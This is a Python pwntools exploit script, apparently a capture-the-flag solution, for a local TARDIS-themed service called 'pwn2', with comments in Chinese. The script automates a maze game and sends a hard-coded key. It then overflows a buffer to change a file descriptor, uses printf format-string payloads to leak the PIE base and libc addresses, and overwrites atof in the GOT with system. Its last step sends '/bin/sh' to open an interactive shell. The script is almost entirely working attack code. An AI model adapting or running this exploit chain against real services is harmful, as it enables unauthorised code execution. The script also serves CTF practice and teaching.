#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
exp for pwn2
"""

import random
from pwn import *

context(arch='i386', os='linux')
#context.log_level = 'debug'

EXE = './pwn2'
LIBC = '/lib/i386-linux-gnu/libc.so.6'

ROW_COUNT = 20
COL_COUNT = 21

def play_game(game_status):
    """
    return operation of current game status.
    return (c, win)
    """
    current_loc, target_loc, angel_loc = scan_game_status(game_status)
    operators = []
    # 根据出口方向位移
    row, col, _ = current_loc
    if row < target_loc[0]:
        if (row + 1, col) not in angel_loc:
            operators.append('s')
    elif row > target_loc[0]:
        if (row - 1, col) not in angel_loc:
            operators.append('w')
    if col < target_loc[1]:
        if (row, col + 1) not in angel_loc:
            operators.append('d')
    elif col > target_loc[1]:
        if (row, col - 1) not in angel_loc:
            operators.append('a')
    # 如果出口方向被堵死，随机选一个可以移动的方向位移
    if len(operators) < 1:
        if row + 1 < ROW_COUNT and (row + 1, col) not in angel_loc:
            operators.append('s')
        if row > 0 and (row - 1, col) not in angel_loc:
            operators.append('w')
        if col + 1 < COL_COUNT and (row, col + 1) not in angel_loc:
            operators.append('d')
        if col > 0 and (row, col - 1) not in angel_loc:
            operators.append('a')
        if len(operators) < 1:
            # 十面埋伏
            raise IndexError('All angels around!')
    if len(operators) > 1:
        operator = random.choice(operators)
    else:
        operator = operators[0]
    if operator == 's':
        nxt = row + 1, col
    elif operator == 'w':
        nxt = row - 1, col
    elif operator == 'd':
        nxt = row, col + 1
    else:
        nxt = row, col - 1
    if target_loc[2] == 'T' and target_loc[1] == nxt[1] and target_loc[0] == nxt[0]:
        return operator, True
    else:
        return operator, False


def scan_game_status(game_status):
    """
    scan game status and return current_location, target_location, angel_location_list
    """
    angel_loc = []
    for i in xrange(1, len(game_status)):
        line = game_status[i]
        linenum = int(line[:2])
        for j in xrange(3, len(line)):
            colnum = j - 3
            char = line[j]
            if char in '^V<>':
                current_loc = (linenum, colnum, char)
            elif char == 'E' or char == 'T':
                target_loc = (linenum, colnum, char)
            elif char == 'A':
                angel_loc.append((linenum, colnum))
    return current_loc, target_loc, angel_loc


def main():
    """main"""
    libc = ELF(LIBC)
    while 1:
        try:
            #io = process(EXE)
            io = remote('127.0.0.1', 4444)
            # play game
            while 1:
                out = io.recvuntil('q): ')
                lines = out.split('\n')
                for i, line in enumerate(lines):
                    if line.startswith('   '):
                        j = i
                        break
                game_status = lines[j : j + COL_COUNT]
                operator, end = play_game(game_status)
                io.sendline(operator)
                if end:
                    break
        except IndexError as err:
            io.close()
            log.error(err.message)
            log.error('No step to go. GAME OVER.')
            log.info('Restart game ...')
        else:
            # win game. 
            break
    log.info('sending tardis key...')
    print io.recvuntil('TARDIS KEY: ')
    # 没看懂
    io.sendline('UeSlhCAGEp')  # WTF. 读入10个字符，然后…？每个字符与0x7f求与后，必须是字符或数字，再与 sub_EB8 地址进行按位比较？

    log.info('overwriting fd...')
    print io.recvuntil('Selection: ')
    io.sendline('a' * 8 + '\x00')  # 溢出，修改 sub_BCB 中的 write 函数的 fd (dword_50B0[2])

    print io.recvuntil('Selection: ')
    sleep(2)  # wait for 2 second so the service's able to call sub_BCB()

    log.info('enable choice 3...')
    io.sendline(p32(0x55592B6C + 1))  # m+YU = 1431907181

    io.sendline('1')  # turn on the TARDIS console

    print io.recvuntil('Selection: ')
    log.info('writing fd back...')
    io.sendline('a' * 8 + '\x03')  # write the fd back to 3 so the rest of our input won't get into sub_BCB()

    print io.recvuntil('Selection: ')
    io.sendline('3')

    print io.recvuntil('Coordinates: ')
    log.success('choice 3 enabled success')

    # 利用printf漏洞，获取当前函数ret的地址，并计算text_base
    # 由于开启了PIE，必须通过计算才能获取atof@got.plt
    log.info('sending payload to detect text address ...')
    pass_xy = '51.492137,-0.192878'
    fmt_offset = 15
    ret_offset = fmt_offset + (0x40c + 4) / 4
    
    payloads = [pass_xy]
    payloads.append('%{}$p'.format(fmt_offset))
    payloads.append('%{}$p'.format(ret_offset))

    payload =  ''.join(payloads)
    
    io.sendline(payload)

    out = io.recvuntil('Coordinates: ')
    print out
    ret_addr = int(out.split('0x')[2][:8], 16)
    log.success('ret_addr: ' + hex(ret_addr))

    text_base = ret_addr - 0x00001491
    log.success('text_base: ' + hex(text_base))

    atof_got_plt = text_base + 0x00005080
    log.success('atof_got_plt: ' + hex(atof_got_plt))

    # 利用printf漏洞，获取atof@got.plt地址及数据
    log.info('sending payload to detect atof address ...')
    payloads = [pass_xy.ljust(20, '@')]
    # 把%s放在地址前面，因为atof_got_plt中可能会出现\x00导致输出失败
    payloads.append('%{}$s'.format(fmt_offset + (20 + 16) / 4).ljust(16, '@'))
    payloads.append(p32(atof_got_plt))
    payload =  ''.join(payloads)
    io.sendline(payload)
    out = io.recvuntil('Coordinates: ')
    print out
    idx = out.find('@')
    atof_addr = u32(out[idx + 1:][:4])
    log.success('atof_addr: ' + hex(atof_addr))

    
    system_addr = libc.symbols['system'] - libc.symbols['atof'] + atof_addr
    log.success('system_addr: ' + hex(system_addr))

    # 利用printf漏洞，将atof替换为system
    log.info('sending payload to replace [atof] of [system] ...')
    byte1 = system_addr & 0xFF
    byte2 = (system_addr & 0xFFFF00) >> 8
    fmt1 = byte1 - 20
    fmt2 = byte2 - fmt1 - 20
    offset = fmt_offset + (20 + 32) / 4

    payloads = [pass_xy.ljust(20, '@')]
    payloads.append('%{f1}c%{p1}$hhn%{f2}c%{p2}$hn'.format\
    (f1=fmt1, f2=fmt2, p1=offset, p2=offset + 1).ljust(32, '@'))
    payloads.extend((p32(atof_got_plt), p32(atof_got_plt + 1)))
    payload = ''.join(payloads)

    io.sendline(payload)
    out = io.recvuntil('Coordinates: ')
    # 发送sh时中间必须带上【,】以保证能通过程序的检测
    io.sendline('/bin/sh;,123')
    io.interactive()


if __name__ == '__main__':
    main()
